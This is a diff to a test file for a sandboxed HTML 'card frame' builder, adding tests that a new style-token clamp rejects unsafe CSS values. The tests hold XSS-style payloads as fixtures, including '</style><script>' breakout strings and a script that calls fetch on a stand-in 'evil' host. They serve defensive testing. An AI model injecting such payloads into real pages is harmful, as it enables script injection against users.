@@ -14,6 +14,7 @@ import {
   CARD_FRAME_SAFE_FLOOR,
   CARD_FRAME_SANDBOX,
   clampCardFrameFontFamily,
+  clampCardFrameStyleTokens,
   clampCardFrameThemeTokens,
   foldCardFrameHeight,
 } from "@orb/kit/card-frame";
@@ -87,7 +88,7 @@ describe("the hash-pinned height script", () => {
   });
 
   test("only the ROUTED document carries the script — the floor would emit markup its policy can never run", () => {
-    const content = { html: "<p>hi</p>", css: undefined, themeTokens: undefined, fontFamily: undefined };
+    const content = { html: "<p>hi</p>", css: undefined, themeTokens: undefined, styleTokens: undefined, fontFamily: undefined };
     const routed = buildCardFrameDocument(content);
     expect(routed).toContain(`<script>${CARD_FRAME_HEIGHT_SCRIPT}</script>`);
     // In HEAD, ahead of the card body: model-authored markup (an unclosed `<!--`) must not be able to
@@ -270,6 +271,37 @@ describe("clampCardFrameThemeTokens", () => {
   });
 });
 
+describe("clampCardFrameStyleTokens (#799 — the NON-COLOR slice)", () => {
+  test("accepts the two shapes it exists for: a CSS length and a font-family list", () => {
+    expect(clampCardFrameStyleTokens({ "--sandbox-radius": "0.5rem", "--sandbox-font-mono": "'Geist Mono', ui-monospace, monospace" })).toEqual({
+      "--sandbox-radius": "0.5rem",
+      "--sandbox-font-mono": "'Geist Mono', ui-monospace, monospace",
+    });
+    expect(clampCardFrameStyleTokens({ "--a": "8px", "--b": "100%", "--c": "1.25em", "--d": "0" })).toEqual({
+      "--a": "8px",
+      "--b": "100%",
+      "--c": "1.25em",
+      "--d": "0",
+    });
+  });
+
+  test("is NOT the color clamp — a color goes in `themeTokens`, and a length would be dropped there", () => {
+    // The two clamps are disjoint by design; this pair is what stops a future edit from collapsing them into
+    // one weaker predicate. `calc()`/`var()` carry parens and are refused outright, never sanitized.
+    expect(clampCardFrameStyleTokens({ "--a": "#101014" })).toEqual({});
+    expect(clampCardFrameThemeTokens({ "--a": "0.5rem" })).toEqual({});
+    expect(clampCardFrameStyleTokens({ "--a": "calc(100% - 2px)", "--b": "var(--x)", "--c": "url(https://evil/)" })).toEqual({});
+  });
+
+  test("drops per-FIELD, and drops every <style> breakout / non-custom-property / non-string shape", () => {
+    expect(clampCardFrameStyleTokens({ "--sandbox-radius": "0.5rem", "--evil": "8px}</style><script>x" })).toEqual({ "--sandbox-radius": "0.5rem" });
+    expect(clampCardFrameStyleTokens({ radius: "0.5rem", "-x": "0.5rem" })).toEqual({});
+    expect(clampCardFrameStyleTokens({ "--a": 8 })).toEqual({});
+    expect(clampCardFrameStyleTokens(null)).toEqual({});
+    expect(clampCardFrameStyleTokens("--a: 8px")).toEqual({});
+  });
+});
+
 describe("clampCardFrameFontFamily", () => {
   test("accepts a plain family list", () => {
     expect(clampCardFrameFontFamily('Inter, "Helvetica Neue", sans-serif')).toBe('Inter, "Helvetica Neue", sans-serif');
@@ -290,6 +322,9 @@ describe("buildCardFrameDocument", () => {
       html: "<p>hi</p>",
       css: undefined,
       themeTokens: { "--sandbox-bg": "red}</style><script>alert(1)</script>" },
+      // #799 — the NON-COLOR slot re-clamps on the same call, with its own grammar. Two hostile shapes, two
+      // clamps, one document: neither may reach the `:root` block.
+      styleTokens: { "--sandbox-radius": "8px}</style><script>alert(3)</script>" },
       fontFamily: "Inter; } body {",
     });
     // The routed document carries OUR one hash-pinned script, so "no script tags" is no longer the
@@ -297,17 +332,19 @@ describe("buildCardFrameDocument", () => {
     expect(html.split("<script>")).toHaveLength(2);
     expect(html).toContain(`<script>${CARD_FRAME_HEIGHT_SCRIPT}</script>`);
     expect(html).not.toContain("alert(1)");
+    expect(html).not.toContain("alert(3)");
+    expect(html).not.toContain("--sandbox-radius");
     // The font fell back to the guaranteed sans face rather than carrying the hostile list through.
     expect(html).toContain("font-family: sans-serif;");
   });
 
   test("passes the card body through VERBATIM — the frame is the boundary, not a sanitizer", () => {
     const body = '<div onclick="steal()"><script>fetch("https://evil")</script></div>';
-    expect(buildCardFrameDocument({ html: body, css: undefined, themeTokens: undefined, fontFamily: undefined })).toContain(body);
+    expect(buildCardFrameDocument({ html: body, css: undefined, themeTokens: undefined, styleTokens: undefined, fontFamily: undefined })).toContain(body);
   });
 
   test("emits the meta policy only when one is supplied — the routed arm's policy lives on the response header", () => {
-    const content = { html: "<p>hi</p>", css: undefined, themeTokens: undefined, fontFamily: undefined };
+    const content = { html: "<p>hi</p>", css: undefined, themeTokens: undefined, styleTokens: undefined, fontFamily: undefined };
     expect(buildCardFrameDocument(content)).not.toContain("http-equiv");
     expect(buildCardFrameDocument(content, "default-src 'none'")).toContain(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'">`);
   });
